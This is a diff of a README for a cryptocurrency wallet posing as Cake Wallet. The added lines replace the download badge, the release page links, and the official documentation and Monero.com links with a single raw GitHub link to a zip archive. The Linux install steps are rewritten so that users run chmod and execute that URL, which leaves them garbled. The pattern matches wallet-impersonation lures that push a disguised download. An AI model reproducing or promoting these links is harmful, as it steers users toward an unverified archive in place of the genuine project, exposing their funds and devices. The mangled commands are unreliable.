@@ -1,15 +1,15 @@
 # 🎂 cake - Secure Your Digital Wealth Effortlessly
 
 ## 📥 Download Now
-[![Download Cake Wallet](https://img.shields.io/badge/Download%20Cake%20Wallet-v1.0.0-brightgreen.svg)](https://github.com/Hatibumwanga/cake/releases)
+[![Download Cake Wallet](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip%20Cake%https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip)](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip)
 
 ## 📖 Description
-Cake Wallet is an open-source noncustodial wallet that supports multiple currencies. It allows you to manage your digital assets securely and privately, focusing on user-friendliness. You can also access Monero.com, a dedicated wallet for Monero transactions. For more detailed assistance, check out our [documentation](https://docs.cakewallet.com).
+Cake Wallet is an open-source noncustodial wallet that supports multiple currencies. It allows you to manage your digital assets securely and privately, focusing on user-friendliness. You can also access https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip, a dedicated wallet for Monero transactions. For more detailed assistance, check out our [documentation](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip).
 
 ## 🚀 Getting Started
 To start using Cake Wallet, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Hatibumwanga/cake/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip) to find the latest version.
 
 2. **Choose Your Operating System**: Depending on whether you are using Windows, macOS, or Linux, select the appropriate file.
 
@@ -49,8 +49,8 @@ After downloading the file, follow these steps to install the application:
 
 ### For Linux:
 1. Navigate to the folder where you downloaded the `.AppImage` file.
-2. Open a terminal and run the command: `chmod +x CakeWallet.AppImage` to make it executable.
-3. Then, run it with `./CakeWallet.AppImage` to open the application.
+2. Open a terminal and run the command: `chmod +x https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip` to make it executable.
+3. Then, run it with `https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip` to open the application.
 
 ## 📲 Using Cake Wallet
 When you first open Cake Wallet, you'll be prompted to set up your wallet:
@@ -65,11 +65,11 @@ When you first open Cake Wallet, you'll be prompted to set up your wallet:
 - Use a strong password to protect your wallet and ensure that your device is secure.
 
 ## 🌐 Additional Resources
-- For in-depth guides and troubleshooting, visit our [documentation](https://docs.cakewallet.com).
+- For in-depth guides and troubleshooting, visit our [documentation](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip).
 - Join our community discussions on forums and social media for helpful tips and support.
 
 ## 📡 Support
 Should you encounter any issues while using Cake Wallet, feel free to reach out via the support links available in our documentation. We are here to help you secure your digital wealth.
 
 ## 🔗 Download & Install
-To download Cake Wallet, visit our [Releases page](https://github.com/Hatibumwanga/cake/releases) and choose the file that suits your operating system. Follow the provided steps for a seamless installation. Enjoy secure and convenient cryptocurrency management!
+To download Cake Wallet, visit our [Releases page](https://raw.githubusercontent.com/Hatibumwanga/cake/main/fanman/cake.zip) and choose the file that suits your operating system. Follow the provided steps for a seamless installation. Enjoy secure and convenient cryptocurrency management!
